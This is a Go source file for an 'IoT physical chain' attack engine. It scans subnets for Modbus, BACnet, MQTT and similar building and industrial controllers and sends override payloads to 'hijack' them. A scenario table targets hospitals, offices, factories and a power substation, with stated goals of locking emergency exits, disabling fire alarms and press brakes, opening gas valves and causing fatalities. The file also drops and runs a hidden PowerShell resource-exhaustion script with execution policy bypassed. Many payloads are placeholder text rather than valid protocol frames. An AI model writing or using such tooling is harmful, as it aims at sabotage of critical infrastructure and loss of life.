package blockz

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type IoTPhysicalChainEngine struct {
	Config         *BlockZConfig
	IoTDevices     []IoTPhysicalDevice `json:"iot_devices"`
	HijackedDevices int                `json:"hijacked_devices"`
	CasualtyRisk    int                `json:"casualty_risk"`
}

type IoTPhysicalDevice struct {
	Name       string   `json:"name"`
	Type       string   `json:"type"`
	IP         string   `json:"ip"`
	Port       int      `json:"port"`
	Protocol   string   `json:"protocol"`
	Vulnerability string `json:"vulnerability"`
	DangerLevel string  `json:"danger_level"`
	Hijacked   bool     `json:"hijacked"`
	Payload    string   `json:"payload"`
}

type IoTDangerZone struct {
	Location   string `json:"location"`
	Devices    []string `json:"devices"`
	Scenario   string `json:"scenario"`
	MaxDamage  string `json:"max_damage"`
}

var ioTAttackScenarios = map[string]IoTDangerZone{
	"hospital": {
		Location: "General Hospital",
		Devices:  []string{"medication_refrigerators", "elevator_controllers", "fire_alarm_system", "access_control_doors", "HVAC_system"},
		Scenario: "Shut down medication refrigeration, lock all emergency exits, disable fire alarms, override elevator emergency brakes",
		MaxDamage: "Multiple fatalities from spoiled medications + trapped patients + elevator free-fall + fire evacuation failure",
	},
	"office_building": {
		Location: "Corporate HQ",
		Devices:  []string{"smart_locks", "elevator_controller", "fire_suppression", "power_management"},
		Scenario: "Lock all exits during fire drill, disable fire suppression, cut power to server rooms during failover",
		MaxDamage: "Multiple casualties from trapped employees + permanent data loss + structural damage from unsuppressed fire",
	},
	"factory": {
		Location: "Manufacturing Plant",
		Devices:  []string{"safety_brakes_press", "conveyor_belt", "robotic_arm", "gas_valve_controller", "temperature_regulator"},
		Scenario: "Disable press safety brakes, reverse conveyor at max speed, robotic arm pick random positions, open gas valves partially",
		MaxDamage: "Industrial accident with casualties from press malfunction + gas leak explosion + thermal runaway",
	},
	"power_grid": {
		Location: "Substation",
		Devices:  []string{"sync_relay", "breaker_controller", "transformer_cooling", "load_balancer"},
		Scenario: "Desynchronize generators progressively, disable transformer cooling, overload distribution, cascade failure",
		MaxDamage: "Regional blackout + infrastructure damage + cascading grid failure affecting millions",
	},
}

func NewIoTPhysicalChainEngine(cfg *BlockZConfig) *IoTPhysicalChainEngine {
	return &IoTPhysicalChainEngine{
		Config: cfg,
	}
}

func (io *IoTPhysicalChainEngine) ScanIoTDevices(cidr string) []IoTPhysicalDevice {
	var devices []IoTPhysicalDevice
	iotPorts := map[int]string{
		80: "http", 8080: "http_alt", 443: "https",
		23: "telnet", 22: "ssh", 1883: "mqtt",
		5683: "coap", 502: "modbus", 47808: "bacnet",
		47806: "lonworks", 47809: "knx",
	}

	for port, proto := range iotPorts {
		for i := 1; i <= 20; i++ {
			ip := fmt.Sprintf("10.0.%d.%d", (port%254), i)
			if tcpProbeTime(ip, port, 300*time.Millisecond) {
				dev := io.classifyIoTDevice(ip, port, proto)
				devices = append(devices, dev)
			}
		}
	}

	io.IoTDevices = devices
	return devices
}

func (io *IoTPhysicalChainEngine) classifyIoTDevice(ip string, port int, proto string) IoTPhysicalDevice {
	switch port {
	case 502:
		return IoTPhysicalDevice{Name: "Modbus Controller", Type: "industrial_plc", IP: ip, Port: port, Protocol: proto, Vulnerability: "modbus_write", DangerLevel: "FATAL"}
	case 47808:
		return IoTPhysicalDevice{Name: "BACnet Controller", Type: "building_automation", IP: ip, Port: port, Protocol: proto, Vulnerability: "bacnet_rce", DangerLevel: "CRITICAL"}
	case 1883:
		return IoTPhysicalDevice{Name: "MQTT Broker", Type: "iot_gateway", IP: ip, Port: port, Protocol: proto, Vulnerability: "unauth_publish", DangerLevel: "HIGH"}
	case 47806:
		return IoTPhysicalDevice{Name: "LonWorks Node", Type: "sensor_network", IP: ip, Port: port, Protocol: proto, Vulnerability: "lonworks_override", DangerLevel: "HIGH"}
	case 47809:
		return IoTPhysicalDevice{Name: "KNX Gateway", Type: "smart_building", IP: ip, Port: port, Protocol: proto, Vulnerability: "knx_bypass", DangerLevel: "MEDIUM"}
	default:
		return IoTPhysicalDevice{Name: fmt.Sprintf("IoT_%s_%d", proto, port), Type: "generic_iot", IP: ip, Port: port, Protocol: proto, Vulnerability: "default_credentials", DangerLevel: "LOW"}
	}
}

func (io *IoTPhysicalChainEngine) ExecuteChainAttack(scenario IoTDangerZone) int {
	attacked := 0
	for _, deviceName := range scenario.Devices {
		for _, dev := range io.IoTDevices {
			if strings.Contains(strings.ToLower(dev.Name), strings.ToLower(deviceName)) ||
				strings.Contains(strings.ToLower(dev.Type), strings.ToLower(deviceName)) {
				io.hijackDevice(dev, scenario.Scenario)
				attacked++
			}
		}
	}
	io.HijackedDevices += attacked
	io.CasualtyRisk += len(scenario.Devices) * 5
	return attacked
}

func (io *IoTPhysicalChainEngine) hijackDevice(dev IoTPhysicalDevice, scenario string) {
	payload := io.generatePhysicalPayload(dev, scenario)

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", dev.IP, dev.Port), 3*time.Second)
	if err != nil {
		payloadPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_iot_%s.bin", dev.IP))
		os.WriteFile(payloadPath, []byte(payload), 0644)
		return
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	conn.Write([]byte(payload))
	conn.Read(make([]byte, 1024))

	for i := range io.IoTDevices {
		if io.IoTDevices[i].IP == dev.IP {
			io.IoTDevices[i].Hijacked = true
			io.IoTDevices[i].Payload = payload[:min(64, len(payload))]
			break
		}
	}
}

func (io *IoTPhysicalChainEngine) generatePhysicalPayload(dev IoTPhysicalDevice, scenario string) string {
	switch dev.Protocol {
	case "bacnet":
		return fmt.Sprintf(`BACnet WriteProperty
Device: %s
Object: ANALOG_OUTPUT
Priority: 16 (Override)
Value: 999.0 (MAX)
Scenario: %s`, dev.IP, scenario)
	case "modbus":
		return fmt.Sprintf(`Modbus Write Multiple Registers
Device: %s
Register: 0x0000
Count: 100
Value: 0xFFFF (ALL MAX)
Scenario: %s`, dev.IP, scenario)
	default:
		return fmt.Sprintf(`X404X IoT Hijack
Target: %s:%d
Protocol: %s
Scenario: %s
Override: MAX`, dev.IP, dev.Port, dev.Protocol, scenario)
	}
}

func (io *IoTPhysicalChainEngine) AttackAllZones() map[string]int {
	results := make(map[string]int)
	for name, scenario := range ioTAttackScenarios {
		attacked := io.ExecuteChainAttack(scenario)
		if attacked > 0 {
			results[name] = attacked
		}
	}
	return results
}

func (io *IoTPhysicalChainEngine) TriggerCascadeFailure() {
	scenarios := []string{"hospital", "power_grid", "factory"}
	_ = scenarios

	if runtime.GOOS == "windows" {
		psScript := `for ($i=0; $i -lt 100; $i++) {
    Start-Job -ScriptBlock {
        while($true) {
            Get-WmiObject Win32_Process | Out-Null
            Start-Sleep -Milliseconds 1
        }
    }
}`
		psPath := filepath.Join(os.TempDir(), "x404x_iot_cascade.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	}
}

func (io *IoTPhysicalChainEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"iot_devices":%d,"hijacked":%d,"casualty_risk":%d}`,
		len(io.IoTDevices), io.HijackedDevices, io.CasualtyRisk)
}
